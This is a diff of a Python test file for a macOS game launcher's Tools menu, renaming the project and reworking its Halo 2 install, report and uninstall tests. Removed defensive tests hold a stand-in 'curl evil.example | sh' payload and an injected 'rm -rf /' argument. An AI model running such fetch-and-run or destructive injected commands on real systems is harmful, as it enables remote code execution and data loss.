@@ -1,7 +1,6 @@
 """Tests for scripts/tools.py (the launcher's Tools menu and auto-fixes), in throwaway homes.
 
-Admin actions run with RECLAIMER_TOOLS_DRYRUN=1, which prints the command instead of asking for a password, so the
-real network startup task is never touched. Run: /usr/bin/python3 -I -m unittest discover -s tests
+Tests and install paths are isolated in throwaway folders. Run: /usr/bin/python3 -I -m unittest discover -s tests
 """
 import importlib.util
 import json
@@ -24,24 +23,20 @@ WORKSHOP = Path("prefix-wine/drive_c/Program Files (x86)/Steam/steamapps/worksho
 class ToolsTest(unittest.TestCase):
     def setUp(self):
         self.tmp = Path(tempfile.mkdtemp())
-        self.home = self.tmp / "Games" / "ProjectReclaimer"
+        self.home = self.tmp / "Games" / "ProjectGravemind"
         for d in ("game", "logs", "tools", WORKSHOP / "content" / "976730"):
             (self.home / d).mkdir(parents=True)
         # the helper scripts sit next to tools.py in an install's game folder
-        for f in ("workshop_helper.py", "presets.py", "fit.py", "reclaimer-loopback.sh",
-                  "local.projectreclaimer.loopback.plist"):
+        for f in ("workshop_helper.py", "presets.py", "fit.py"):
             shutil.copy(REPO / "scripts" / f, self.home / "game" / f)
         shutil.copy(TOOLS, self.home / "game" / "tools.py")
         self.apps = self.tmp / "Applications"
-        (self.apps / "Project Reclaimer.app" / "Contents").mkdir(parents=True)
+        (self.apps / "Project Gravemind.app" / "Contents").mkdir(parents=True)
         self.desktop = self.tmp / "Desktop"
         self.desktop.mkdir()
-        self.daemon = self.tmp / "local.projectreclaimer.loopback.plist"  # stands in for /Library/LaunchDaemons/…
-        self.daemon.write_text("<plist/>")
-        self.env = dict(os.environ, RECLAIMER_HOME=str(self.home), RECLAIMER_TOOLS_DRYRUN="1",
-                        RECLAIMER_TEST_DAEMON_PLIST=str(self.daemon),
+        self.env = dict(os.environ, RECLAIMER_HOME=str(self.home),
                         RECLAIMER_APPS_DIR=str(self.apps), RECLAIMER_DESKTOP=str(self.desktop),
-                        RECLAIMER_GAME_PROCESS=r"project-reclaimer-v9\.9\.99\.exe game-client")
+                        GRAVEMIND_GAME_PROCESS=r"h2gravemind\.exe")
 
     def tearDown(self):
         shutil.rmtree(self.tmp)
@@ -164,90 +159,6 @@ class ToolsTest(unittest.TestCase):
         self.assertEqual(rc, 0)
         self.assertIn(out[-1].split("\t")[0], ("ok", "muted", "virtual", "headset"))
 
-    # ---- network -----------------------------------------------------------------------------------------------
-    def test_net_check_needs_every_range(self):
-        t = self.load()
-        full = "\n".join(f"\tinet {a} netmask 0xffffffff" for a in t.EXPECTED_ALIASES)
-        with mock.patch.object(t, "lo0", return_value="lo0: flags\n\tinet 127.0.0.1 netmask 0xff000000\n" + full):
-            self.assertEqual(t.net_check(), "ok")
-        with mock.patch.object(t, "lo0", return_value="lo0: flags\n\tinet 127.0.0.1 netmask 0xff000000\n"):
-            self.assertEqual(t.net_check(), "missing")
-
-    def test_expected_aliases_come_from_the_installed_loopback_script(self):
-        script = self.home / "game" / "reclaimer-loopback.sh"
-        script.write_text(script.read_text().replace("; do", " 127.0.9; do", 1))  # a range a release adds
-        t = self.load()
-        for prefix in ("127.0.0.", "127.0.1.", "127.0.2.", "127.3.1.", "127.0.9."):
-            self.assertTrue(any(a.startswith(prefix) for a in t.EXPECTED_ALIASES), prefix)
-
-    def test_net_fix_reinstalls_and_restarts_the_startup_task_with_one_password_prompt(self):
-        rc, out = self.run_tool("net-fix")
-        self.assertEqual(rc, 0, out)
-        admin = [l for l in out if l.startswith("dry-run admin: ")]
-        self.assertEqual(len(admin), 1, out)
-        cmd = admin[0]
-        self.assertEqual(subprocess.run(["/bin/sh", "-n", "-c", cmd[len("dry-run admin: "):]]).returncode, 0,
-                         "not valid shell")  # ("/Library/Application Support" has a space)
-        self.assertIn("/Library/LaunchDaemons/local.projectreclaimer.loopback.plist", cmd)
-        self.assertIn("launchctl bootstrap system", cmd)
-        self.assertIn("reclaimer-loopback.sh", cmd)
-        self.assertEqual(out[-1], "ok")
-
-    def test_net_fix_root_command_checks_what_it_installed(self):
-        # the copy in the game folder is the player's to change: what runs as root at boot is checked, after copying
-        # it where only root can write, against the checksum this script ships with (security review, M1)
-        t = self.load()
-        cmd = self.run_tool("net-fix")[1]
-        cmd = next(l for l in cmd if l.startswith("dry-run admin: "))
-        self.assertIn(t.LOOPBACK_SHA, cmd)
-        self.assertIn(t.LOOPBACK_PLIST_SHA, cmd)
-        self.assertLess(cmd.index("install -o root"), cmd.index("shasum"))
-        # the check itself, run on stand-ins for the two root-owned copies: right files pass, a swapped one is removed
-        check = cmd[cmd.index("{ printf"):cmd.index("&& { launchctl")]
-        for swapped in (False, True):
-            d = self.tmp / f"root-{swapped}"
-            d.mkdir()
-            script, plist = d / "reclaimer-loopback.sh", d / "loopback.plist"
-            shutil.copy(REPO / "scripts" / "reclaimer-loopback.sh", script)
-            shutil.copy(REPO / "scripts" / "local.projectreclaimer.loopback.plist", plist)
-            if swapped:
-                script.write_text("#!/bin/sh\ncurl evil.example | sh\n")
-            run = check.replace(t.quoted(t.DAEMON_DIR + "/reclaimer-loopback.sh"), t.quoted(script)) \
-                       .replace(t.DAEMON_PLIST, t.quoted(plist))
-            rc = subprocess.run(["/bin/sh", "-c", run], capture_output=True).returncode
-            self.assertEqual(rc != 0, swapped, run)
-            self.assertEqual(script.exists(), not swapped)
-
-    def test_net_fix_restarts_the_installed_task_without_reinstalling_it(self):
-        # the root-owned copy is already right: only restart it, so no file of the player's goes to root at all
-        daemon_dir = self.tmp / "daemon-dir"
-        daemon_dir.mkdir()
-        shutil.copy(REPO / "scripts" / "reclaimer-loopback.sh", daemon_dir / "reclaimer-loopback.sh")
-        shutil.copy(REPO / "scripts" / "local.projectreclaimer.loopback.plist", self.daemon)
-        rc, out = self.run_tool("net-fix", RECLAIMER_TEST_DAEMON_DIR=str(daemon_dir))
-        cmd = next(l for l in out if l.startswith("dry-run admin: "))
-        self.assertNotIn("install -o root", cmd)
-        self.assertIn("launchctl bootstrap system", cmd)
-
-    def test_shipped_checksums_match_the_network_files(self):
-        t = self.load()
-        sha = lambda f: subprocess.run(["shasum", "-a", "256", str(REPO / "scripts" / f)], capture_output=True,
-                                       text=True).stdout.split()[0]
-        self.assertEqual(t.LOOPBACK_SHA, sha("reclaimer-loopback.sh"))
-        self.assertEqual(t.LOOPBACK_PLIST_SHA, sha("local.projectreclaimer.loopback.plist"))
-        install = (REPO / "install.sh").read_text()
-        self.assertIn(f"LOOPBACK_SHA={t.LOOPBACK_SHA}", install)
-        self.assertIn(f"LOOPBACK_PLIST_SHA={t.LOOPBACK_PLIST_SHA}", install)
-
-    def test_admin_prompt_keeps_non_ascii_paths(self):
-        # json.dumps escaped é as \u00e9, which AppleScript rejects: net-fix failed for such install paths
-        t = self.load()
-        script = t.admin_script("ls '/Users/José/Games'", "Project Reclaimer")
-        self.assertIn("José", script)
-        self.assertNotIn("\\u00e9", script)
-        self.assertEqual(subprocess.run(["/usr/bin/osacompile", "-o", str(self.tmp / "x.scpt"), "-e", script],
-                                        capture_output=True).returncode, 0, script)
-
     # ---- crash check -------------------------------------------------------------------------------------------
     def test_crash_check(self):
         log = self.home / "logs" / "client-wine.log"
@@ -256,13 +167,13 @@ class ToolsTest(unittest.TestCase):
         log.write_text("...\nYour graphics card stopped responding, so the game had to close.\n")
         self.assertTrue(self.run_tool("crash-check")[1][-1].startswith("crash: The graphics card stopped"))
         log.write_text("thread 'main' panicked at src/thing.rs:1:2:\nboom\n")
-        self.assertTrue(self.run_tool("crash-check")[1][-1].startswith("crash: Project Reclaimer hit an error"))
+        self.assertTrue(self.run_tool("crash-check")[1][-1].startswith("crash: Project Gravemind hit an error"))
 
     # ---- startup state (the watchdog) --------------------------------------------------------------------------
 
     def start_fake_game(self):
         game = subprocess.Popen([sys.executable, "-c", "import time; time.sleep(30)",
-                                 "project-reclaimer-v9.9.99.exe game-client"])
+                                 "h2gravemind.exe"])
 
         def stop():  # (kill and reap, so no ResourceWarning about a still-running child)
             game.kill()
@@ -372,7 +283,7 @@ class ToolsTest(unittest.TestCase):
     def test_remove_mod_refuses_while_the_game_runs_and_rejects_odd_ids(self):
         self.add_mod("111", "Warlock", 10)
         game = subprocess.Popen([sys.executable, "-c", "import time; time.sleep(30)",
-                                 "project-reclaimer-v9.9.99.exe game-client"])
+                                 "h2gravemind.exe"])
         try:
             self.assertEqual(self.run_tool("remove-mod", "111")[1][-1], "error: Quit the game first.")
         finally:
@@ -398,281 +309,120 @@ class ToolsTest(unittest.TestCase):
         self.assertNotIn("SecretName", text)
         self.assertNotIn("steam-account", " ".join(names))
 
-    def test_report_includes_the_startup_state_and_the_forge_cache(self):
-        # a stalled start: the build marker is logged, the cache was last written before this run, long enough ago
-        (self.home / "steam-account").write_text("SecretName\n")
-        self.write_cache(payload=b"x" * 4096)
-        time.sleep(1.2)  # (ps reports elapsed in whole seconds, so make the cache clearly older than the start)
-        self.start_fake_game()
-        self.write_log("Forge library: building it while the game starts.\n")
-        rc, out = self.run_tool("report", RECLAIMER_STALL_SECONDS="0")
-        self.assertEqual(rc, 0, out)
-        with zipfile.ZipFile(Path(out[-1][3:])) as z:
-            text = "".join(z.read(n).decode("utf-8", "replace") for n in z.namelist())
-        self.assertIn("Startup: stalled", text)
-        self.assertIn("stall threshold 0 s", text)
-        self.assertIn("Forge cache: 4096 bytes in 1 file", text)
-        self.assertIn("no cache writes this run", text)
-        self.assertNotIn("SecretName", text)  # (the report is made to be shared)
-
-    def test_report_carries_the_startup_state_as_data(self):
-        self.write_cache(payload=b"x" * 4096)
-        time.sleep(1.2)  # (as above: the cache is from an earlier run)
-        self.start_fake_game()
-        self.write_log("Forge library: building it while the game starts.\n")
-        rc, out = self.run_tool("report", RECLAIMER_STALL_SECONDS="0")
-        self.assertEqual(rc, 0, out)
-        with zipfile.ZipFile(Path(out[-1][3:])) as z:
-            startup = json.loads(z.read("startup-state.json"))
-        self.assertEqual(startup["state"], "stalled")
-        self.assertEqual(startup["stall_after_s"], 0)
-        self.assertGreaterEqual(startup["elapsed_s"], 0)
-        self.assertFalse(startup["wrote_this_run"])
-        self.assertEqual(startup["forge_cache"]["bytes"], 4096)
-        self.assertEqual(startup["forge_cache"]["files"], 1)
-        self.assertGreaterEqual(startup["forge_cache"]["newest_age_s"], 1)
-
-    def test_report_still_works_when_the_game_has_never_run(self):
-        # no game process, no Forge cache, no log: the report must still be made
+    def test_report_identifies_gravemind_and_halo2_install_state(self):
+        self.fake_mcc(halo2=True)
+        (self.home / "game" / "gravemind").mkdir(parents=True)
+        (self.home / "game" / "gravemind" / ".release-version").write_text("0.18.374\n")
         rc, out = self.run_tool("report")
         self.assertEqual(rc, 0, out)
-        self.assertTrue(out[-1].startswith("ok "), out)
         with zipfile.ZipFile(Path(out[-1][3:])) as z:
-            startup = json.loads(z.read("startup-state.json"))
             summary = z.read("summary.txt").decode()
-        self.assertEqual(startup["state"], "stopped")
-        self.assertEqual(startup["elapsed_s"], None)
-        self.assertEqual(startup["forge_cache"], {"bytes": 0, "files": 0, "newest_age_s": None})
-        self.assertIn("Startup: stopped", summary)
-        self.assertIn("Forge cache: 0 bytes in 0 files, never written", summary)
-
-    def test_report_still_works_when_the_startup_check_fails(self):
-        t = self.load()
-        with mock.patch.object(t, "startup_state", side_effect=RuntimeError("the probe broke")):
-            result = t.report()
-        self.assertTrue(result.startswith("ok "), result)
-        with zipfile.ZipFile(Path(result[3:])) as z:
-            summary = z.read("summary.txt").decode()
-            names = z.namelist()
-        self.assertIn("Startup: unknown (the startup check failed)", summary)
-        self.assertNotIn("startup-state.json", names)  # (no invented verdict)
-        self.assertNotIn("the probe broke", summary)  # (an error's own words can name paths)
+        self.assertIn("Project Gravemind: 0.18.374", summary)
+        self.assertIn("Halo 2 installed: yes", summary)
+        self.assertNotIn("Forge cache", summary)
     def test_report_leaves_out_the_mac_user_name_and_logged_steam_names(self):
         (self.home / "logs" / "launcher.log").write_text(
-            f"started (home {Path.home()}/Games/ProjectReclaimer)\nDepotDownloader -username OldName -remember-password\n")
+            f"started (home {Path.home()}/Games/ProjectGravemind)\nDepotDownloader -username OldName -remember-password\n")
         rc, out = self.run_tool("report")
         with zipfile.ZipFile(Path(out[-1][3:])) as z:
             text = "".join(z.read(n).decode("utf-8", "replace") for n in z.namelist())
         self.assertNotIn(str(Path.home()), text)
-        self.assertIn("~/Games/ProjectReclaimer", text)
+        self.assertIn("~/Games/ProjectGravemind", text)
         self.assertNotIn("OldName", text)  # (after Forget Steam the account file is gone, but logs still name it)
 
-    # ---- graphics / steam --------------------------------------------------------------------------------------
+    # ---- Steam account and Halo 2 game files ------------------------------------------------------------------
     def test_forget_steam(self):
         (self.home / "steam-account").write_text("RealName_1\n")
         self.assertEqual(self.run_tool("forget-steam")[1][-1], "ok")
         self.assertFalse((self.home / "steam-account").exists())
 
-    def test_reset_graphics_writes_the_tuned_settings(self):
-        profile = self.home / "prefix-wine/drive_c/users/player/Documents/My Games/Project Reclaimer"
-        profile.mkdir(parents=True)
-        (profile / "settings.json").write_text(json.dumps({"version": 1, "graphics": {"frame_limit": 240},
-                                                           "mouse_sensitivity": 3.0}))
-        rc, out = self.run_tool("reset-graphics")
-        self.assertEqual(out[-1], "ok", out)
-        settings = json.loads((profile / "settings.json").read_text())
-        self.assertEqual(settings["graphics"]["frame_limit"], 60)
-        self.assertEqual(settings["mouse_sensitivity"], 3.0)  # only graphics change
-
-    def test_repair_and_graphics_wait_for_the_game_to_quit(self):
-        # (spawned from the install's game folder so the fake counts as this installation's game either way)
-        game = subprocess.Popen([sys.executable, "-c", "import time; time.sleep(30)",
-                                 "project-reclaimer-v9.9.99.exe game-client"],
-                                cwd=str(self.home / "game"))
-        try:
-            # in-process so free space can be stubbed: this machine has less than add-game needs, and the
-            # running-game refusal has to be what the commands hit first
-            tools = self.load()
-            with mock.patch.object(tools.shutil, "disk_usage", return_value=mock.Mock(free=200 * 10**9)), \
-                    mock.patch.object(tools.helper(), "game_download", return_value="ok"):
-                self.assertEqual(tools.repair(), "error: Quit the game first.")
-                self.assertEqual(tools.add_games(["odst"]), "error: Quit the game first.")
-                self.assertEqual(tools.remove_game("odst"), "error: Quit the game first.")
-                self.assertEqual(tools.repair_game("halo3"), "error: Quit the game first.")
-            self.assertEqual(tools.reset_graphics(), "error: Quit the game first.")
-        finally:
-            game.kill()
-            game.wait()
-
-    def fake_mcc(self, odst=True, halo3=True):
+    def fake_mcc(self, halo2=True, multiplayer=True):
         mcc = self.home / "prefix-wine/drive_c/Program Files (x86)/Steam/steamapps/common/Halo The Master Chief Collection"
         (mcc / "MCC").mkdir(parents=True)
         (mcc / "MCC" / "shared.pak").write_bytes(b"x" * 500)
         (mcc / ".DepotDownloader").mkdir()
         (mcc / ".DepotDownloader" / "976731_1.manifest").write_bytes(b"m")
-        if halo3:
-            (mcc / "halo3").mkdir()
-            (mcc / "halo3" / "halo3.dll").write_bytes(b"x" * 3000)
-            for depot in ("976738_2", "976739_3"):
+        if halo2:
+            paks = mcc / "halo2" / "preload" / "paks"
+            paks.mkdir(parents=True)
+            (paks / "campaign.pck").write_bytes(b"x" * 3000)
+            (mcc / ".DepotDownloader" / "976735_2.manifest").write_bytes(b"m")
+        if multiplayer:
+            maps = mcc / "halo2" / "h2_maps_win64_dx11"
+            maps.mkdir(parents=True)
+            (maps / "ascension.map").write_bytes(b"m" * 1000)
+            for depot in ("976736_4", "976737_5"):
                 (mcc / ".DepotDownloader" / f"{depot}.manifest").write_bytes(b"m")
-        if odst:
-            (mcc / "halo3odst").mkdir()
-            (mcc / "halo3odst" / "halo3odst.dll").write_bytes(b"x" * 1000)
-            (mcc / ".DepotDownloader" / "1064222_4.manifest").write_bytes(b"m")
-            (mcc / ".DepotDownloader" / "1064222_4.manifest.sha").write_bytes(b"s")
         return mcc
 
-    def test_games_lists_halo3_and_odst_with_sizes_and_folders(self):
+    def test_games_lists_halo2_campaign_files(self):
         mcc = self.fake_mcc()
         data = json.loads(self.run_tool("games")[1][-1])
-        self.assertGreater(data["free_bytes"], 0)
-        self.assertGreaterEqual(data["mcc_bytes"], 4500)  # (everything in the MCC folder)
-        halo3, odst = data["games"]
-        self.assertEqual((halo3["id"], halo3["installed"], halo3["bytes"], halo3["path"]),
-                         ("halo3", True, 3000, str(mcc / "halo3")))  # (MCC's shared files belong to neither)
-        self.assertEqual((odst["id"], odst["installed"], odst["bytes"], odst["path"]),
-                         ("odst", True, 1000, str(mcc / "halo3odst")))
+        halo2, = data["games"]
+        self.assertEqual((halo2["id"], halo2["installed"], halo2["bytes"], halo2["path"]),
+                         ("halo2", True, 4000, str(mcc / "halo2")))
 
-    def test_games_without_odst(self):
-        self.fake_mcc(odst=False)
-        halo3, odst = json.loads(self.run_tool("games")[1][-1])["games"]
-        self.assertTrue(halo3["installed"])
-        self.assertEqual((odst["installed"], odst["bytes"]), (False, 0))
+    def test_campaign_without_multiplayer_is_not_installed(self):
+        self.fake_mcc(multiplayer=False)
+        halo2, = json.loads(self.run_tool("games")[1][-1])["games"]
+        self.assertFalse(halo2["installed"])
 
-    def manifests(self, mcc):
-        return sorted(f.name for f in (mcc / ".DepotDownloader").iterdir())
+    def test_games_reports_missing_halo2(self):
+        self.fake_mcc(halo2=False)
+        halo2, = json.loads(self.run_tool("games")[1][-1])["games"]
+        self.assertEqual((halo2["installed"], halo2["bytes"]), (False, 1000))
 
-    def test_remove_odst_deletes_only_odst(self):
-        mcc = self.fake_mcc()
-        self.assertEqual(self.run_tool("remove-game", "odst")[1][-1], "ok")
-        self.assertFalse((mcc / "halo3odst").exists())
-        self.assertTrue((mcc / "halo3" / "halo3.dll").exists())
-        self.assertEqual(self.manifests(mcc), ["976731_1.manifest", "976738_2.manifest", "976739_3.manifest"])
-        self.assertFalse((self.home / "halo3-removed").exists())
-
-    def test_remove_halo3_keeps_odst_and_mccs_shared_files(self):
-        mcc = self.fake_mcc()
-        self.assertEqual(self.run_tool("remove-game", "halo3")[1][-1], "ok")
-        self.assertFalse((mcc / "halo3").exists())
-        self.assertTrue((mcc / "halo3odst" / "halo3odst.dll").exists())
-        self.assertTrue((mcc / "MCC" / "shared.pak").exists())
-        self.assertEqual(self.manifests(mcc), ["1064222_4.manifest", "1064222_4.manifest.sha", "976731_1.manifest"])
-        self.assertTrue((self.home / "halo3-removed").exists())  # (so Mac port updates don't stop on it)
-
-    def test_remove_a_game_that_isnt_installed_or_isnt_a_game(self):
-        self.fake_mcc(odst=False)
-        self.assertEqual(self.run_tool("remove-game", "odst"), (1, ["error: Halo 3: ODST isn't installed."]))
-        self.assertEqual(self.run_tool("remove-game", "../halo3")[1][-1], "error: That isn't a game Project Reclaimer plays.")
-
-    def test_add_games_downloads_mcc_and_the_chosen_games(self):
-        self.fake_mcc(halo3=False, odst=False)
-        (self.home / "halo3-removed").write_text("")
+    def test_add_game_downloads_shared_and_halo2_depots(self):
+        self.fake_mcc(halo2=False)
         tools = self.load()
         with mock.patch.object(tools.helper(), "game_download", return_value="ok") as download, \
-                mock.patch.object(tools.shutil, "disk_usage", return_value=mock.Mock(free=200 * 10**9)):
-            self.assertEqual(tools.add_games(["odst"]), "ok")
-            download.assert_called_with(str(tools.MCC_DIR), ["976731", "1064222"])
-            self.assertTrue((self.home / "halo3-removed").exists())
-            self.assertEqual(tools.add_games(["halo3", "odst"]), "ok")
-            download.assert_called_with(str(tools.MCC_DIR), ["976731", "976738", "976739", "1064222"])
-        self.assertFalse((self.home / "halo3-removed").exists())
+            mock.patch.object(tools.shutil, "disk_usage", return_value=mock.Mock(free=200 * 10**9)), \
+            mock.patch.object(tools, "game_running", return_value=False):
+            self.assertEqual(tools.add_games(["halo2"]), "ok")
+            download.assert_called_with(str(tools.MCC_DIR), ["976731", "976735", "976736", "976737"])
 
-    def test_add_games_needs_room_for_them(self):
-        # a full disk used to end as a DepotDownloader error part-way through ~9 GB
-        self.fake_mcc(odst=False)
+    def test_campaign_only_install_needs_only_multiplayer_space(self):
+        self.fake_mcc(multiplayer=False)
         tools = self.load()
         with mock.patch.object(tools.helper(), "game_download", return_value="ok") as download, \
-                mock.patch.object(tools.shutil, "disk_usage", return_value=mock.Mock(free=5 * 10**9)):
-            result = tools.add_games(["odst"])
-        self.assertTrue(result.startswith("error: ") and "GB" in result, result)
-        download.assert_not_called()
-        with mock.patch.object(tools.helper(), "game_download", return_value="ok"), \
-                mock.patch.object(tools.shutil, "disk_usage", return_value=mock.Mock(free=50 * 10**9)):
-            self.assertEqual(tools.add_games(["odst"]), "ok")
+            mock.patch.object(tools.shutil, "disk_usage", return_value=mock.Mock(free=35 * 10**9)), \
+            mock.patch.object(tools, "game_running", return_value=False):
+            self.assertEqual(tools.add_games(["halo2"]), "ok")
+        download.assert_called_once_with(str(tools.MCC_DIR), ["976731", "976735", "976736", "976737"])
 
-    def test_remove_game_explains_a_folder_it_cant_delete(self):
-        mcc = self.fake_mcc()
-        elsewhere = self.tmp / "elsewhere"
-        shutil.move(str(mcc / "halo3odst"), elsewhere)
-        (mcc / "halo3odst").symlink_to(elsewhere)  # (rmtree refuses symlinks: an error line, not a traceback)
-        rc, out = self.run_tool("remove-game", "odst")
-        self.assertEqual(rc, 1)
-        self.assertTrue(out[-1].startswith("error: "), out)
-        self.assertTrue((elsewhere / "halo3odst.dll").exists())
-
-    def test_a_failed_halo3_download_keeps_the_removed_marker(self):
-        self.fake_mcc(halo3=False)
-        (self.home / "halo3-removed").write_text("")
-        tools = self.load()
-        with mock.patch.object(tools.helper(), "game_download", return_value="error: Couldn't reach Steam."), \
-                mock.patch.object(tools.shutil, "disk_usage", return_value=mock.Mock(free=200 * 10**9)):
-            self.assertEqual(tools.add_games(["halo3"]), "error: Couldn't reach Steam.")
-        self.assertTrue((self.home / "halo3-removed").exists())
-
-    def test_repair_checks_one_installed_game(self):
-        self.fake_mcc(halo3=False)
+    def test_repair_checks_halo2_files(self):
+        self.fake_mcc()
         tools = self.load()
         with mock.patch.object(tools.helper(), "game_download", return_value="ok") as download:
-            self.assertEqual(tools.repair_game("odst"), "ok")
-            download.assert_called_once_with(str(tools.MCC_DIR), ["976731", "1064222"])
-            self.assertEqual(tools.repair_game("halo3"), "error: Halo 3 isn't installed. Add it first.")
-            self.assertEqual(tools.repair(), "ok")  # (every installed game: here only ODST)
-            download.assert_called_with(str(tools.MCC_DIR), ["976731", "1064222"])
+            self.assertEqual(tools.repair_game("halo2"), "ok")
+            download.assert_called_once_with(str(tools.MCC_DIR), ["976731", "976735", "976736", "976737"])
+            self.assertEqual(tools.repair(), "ok")
 
-    # ---- server versions and rejoining ----
-    def fake_wine(self, script):
-        wine = self.home / "wine/Wine Staging.app/Contents/Resources/wine/bin/wine"
-        wine.parent.mkdir(parents=True, exist_ok=True)
-        wine.write_text("#!/bin/sh\n" + script + "\n")
-        wine.chmod(0o755)
-        (self.home / "game" / "project-reclaimer-v0.9.13.exe").write_bytes(b"MZ")
+    def test_add_game_requires_space_for_campaign_multiplayer_and_mcc(self):
+        self.fake_mcc(halo2=False)
+        tools = self.load()
+        with mock.patch.object(tools.helper(), "game_download") as download, \
+                mock.patch.object(tools.shutil, "disk_usage", return_value=mock.Mock(free=5 * 10**9)):
+            result = tools.add_games(["halo2"])
+        self.assertIn("GB", result)
+        download.assert_not_called()
 
-    def test_server_version(self):
-        self.fake_wine('echo "Server queries: version 0.9.13"; echo \'{"address": "1.2.3.4:5", "name": "Star Wars", '
-                       '"version": "0.9.11"}\'')
-        self.assertEqual(self.run_tool("server-version", "1.2.3.4:5")[1][-1], "0.9.11 Star Wars")
+    def test_remove_game_only_deletes_halo2_files(self):
+        mcc = self.fake_mcc()
+        self.assertEqual(self.run_tool("remove-game", "halo2")[1][-1], "ok")
+        self.assertFalse((mcc / "halo2").exists())
+        self.assertTrue((mcc / "MCC" / "shared.pak").exists())
+        self.assertEqual(sorted(f.name for f in (mcc / ".DepotDownloader").iterdir()), ["976731_1.manifest"])
 
-    def test_server_version_name_cant_add_lines(self):
-        # a server's name is the server's to choose; a newline in it used to add a fake "<version> <name>" line
-        self.fake_wine("printf '%s\\n' '{\"name\": \"Evil\\n0.9.1 Fake\", \"version\": \"0.9.11\"}'")
-        out = self.run_tool("server-version", "1.2.3.4:5")[1]
-        self.assertEqual(out, ["0.9.11 Evil 0.9.1 Fake"])
-
-    def test_server_version_of_a_server_that_doesnt_answer(self):
-        self.fake_wine('echo "Error: Connecting to game server (UDP/QUIC): no response within 2500 ms"; exit 1')
-        self.assertEqual(self.run_tool("server-version", "1.2.3.4:5")[1][-1], "unreachable")
-
-    def test_server_version_rejects_odd_addresses(self):
-        self.assertTrue(self.run_tool("server-version", "1.2.3.4; rm -rf /")[1][-1].startswith("error: "))
-
-    def joined_with(self):
-        record = self.tmp / "joined"
-        for _ in range(50):
-            if record.exists():
-                return record.read_text().strip()
-            time.sleep(0.1)
-        return ""
-
-    def test_join_hands_just_the_link_to_the_running_game(self):
-        self.fake_wine(f'echo "$(pwd) $@" > {self.tmp / "joined"}')
-        self.assertEqual(self.run_tool("join", "75.98.127.226:49241")[1][-1], "ok")
-        # (the game ignores a link given together with other arguments)
-        self.assertEqual(self.joined_with(),
-                         f"{(self.home / 'game').resolve()} project-reclaimer-v0.9.13.exe reclaimer://join?server=75.98.127.226:49241")
-
-    def test_join_uses_the_chosen_older_version(self):
-        self.fake_wine(f'echo "$(pwd) $@" > {self.tmp / "joined"}')
-        (self.home / "game" / "versions").mkdir()
-        (self.home / "game" / "versions" / "project-reclaimer-v0.9.11.exe").write_bytes(b"MZ")
-        (self.home / "game" / "chosen-version").write_text("0.9.11\n")
-        self.run_tool("join", "1.2.3.4:5")
-        self.assertEqual(self.joined_with(),
-                         f"{(self.home / 'game' / 'versions').resolve()} project-reclaimer-v0.9.11.exe reclaimer://join?server=1.2.3.4:5")
+    def test_remove_game_refuses_invalid_ids(self):
+        self.fake_mcc(halo2=False, multiplayer=False)
+        self.assertIn("isn't installed", self.run_tool("remove-game", "halo2")[1][-1])
+        self.assertIn("Project Gravemind plays", self.run_tool("remove-game", "../halo2")[1][-1])
 
     # ---- force quit / uninstall --------------------------------------------------------------------------------
     def test_force_quit_stops_the_game(self):
         game = subprocess.Popen([sys.executable, "-c", "import time; time.sleep(60)",
-                                 "project-reclaimer-v9.9.99.exe game-client"])
+                                 "h2gravemind.exe"])
         try:
             rc, out = self.run_tool("force-quit")
             self.assertEqual(out[-1], "ok")
@@ -689,7 +439,7 @@ class ToolsTest(unittest.TestCase):
         ws.write_text("#!/bin/sh\nsleep 120\n")
         ws.chmod(0o755)
         game = subprocess.Popen([sys.executable, "-c", "import time; time.sleep(60)",
-                                 "project-reclaimer-v9.9.99.exe game-client"])
+                                 "h2gravemind.exe"])
         try:
             rc, out = self.run_tool("force-quit")
             self.assertEqual(out[-1], "ok", out)
@@ -699,42 +449,27 @@ class ToolsTest(unittest.TestCase):
                 game.kill()
             subprocess.run(["pkill", "-f", str(ws)])
 
-    def test_uninstall_without_the_network_task_asks_for_no_password(self):
-        self.daemon.unlink()
+    def test_uninstall_leaves_the_system_network_task_untouched(self):
+        daemon = self.tmp / "local.projectreclaimer.loopback.plist"
+        daemon.write_text("<plist/>")
         rc, out = self.run_tool("uninstall")
         self.assertEqual(out[-1], "ok")
+        self.assertTrue(daemon.exists())
         self.assertFalse([l for l in out if l.startswith("dry-run admin: ")])
 
-    def test_uninstall_says_so_when_the_password_box_was_cancelled(self):
-        rc, out = self.run_tool("uninstall", RECLAIMER_TOOLS_DRYRUN="cancel")
-        self.assertEqual(out[-1], "ok network-kept")
-        self.assertFalse(self.home.exists())
-
-    def test_uninstall_also_removes_the_old_metal_app(self):
-        (self.apps / "Project Reclaimer Metal.app").mkdir()
-        self.run_tool("uninstall")
-        self.assertFalse((self.apps / "Project Reclaimer Metal.app").exists())
-
-    def test_uninstall_removes_app_and_install_and_asks_once_for_the_network_task(self):
+    def test_uninstall_removes_only_the_gravemind_app_and_install(self):
+        (self.apps / "Project Reclaimer.app").mkdir()
         rc, out = self.run_tool("uninstall")
         self.assertEqual(out[-1], "ok", out)
         self.assertFalse(self.home.exists())
-        self.assertFalse((self.apps / "Project Reclaimer.app").exists())
-        admin = [l for l in out if l.startswith("dry-run admin: ")]
-        self.assertEqual(len(admin), 1)
-        self.assertIn("launchctl bootout system/local.projectreclaimer.loopback", admin[0])
+        self.assertTrue((self.apps / "Project Reclaimer.app").exists())
+        self.assertFalse((self.apps / "Project Gravemind.app").exists())
 
-    def test_uninstall_removes_every_game(self):
-        for halo3 in (True, False):  # (also once Halo 3 was removed in Tools and only ODST is left)
-            with self.subTest(halo3=halo3):
-                self.setUp()
-                mcc = self.fake_mcc(halo3=halo3)
-                self.assertEqual(self.run_tool("uninstall")[1][-1], "ok")
-                self.assertFalse((mcc / "halo3").exists())
-                self.assertFalse((mcc / "halo3odst").exists())
-                self.assertFalse(self.home.exists())
-                self.tearDown()
-        self.setUp()  # (for the tearDown that follows)
+    def test_uninstall_removes_its_local_halo2_files(self):
+        mcc = self.fake_mcc()
+        self.assertEqual(self.run_tool("uninstall")[1][-1], "ok")
+        self.assertFalse((mcc / "halo2").exists())
+        self.assertFalse(self.home.exists())
 
     def test_uninstall_only_stops_this_installs_helpers(self):
         # e.g. another install's QR sign-in: the reviewer's test run once killed a live sign-in this way
@@ -747,7 +482,7 @@ class ToolsTest(unittest.TestCase):
             other.kill()
 
     def test_uninstall_removes_the_app_the_player_opened(self):
-        moved = self.tmp / "Elsewhere" / "Project Reclaimer.app"
+        moved = self.tmp / "Elsewhere" / "Project Gravemind.app"
         moved.mkdir(parents=True)
         self.run_tool("uninstall", RECLAIMER_APP_PATH=str(moved))
         self.assertFalse(moved.exists())
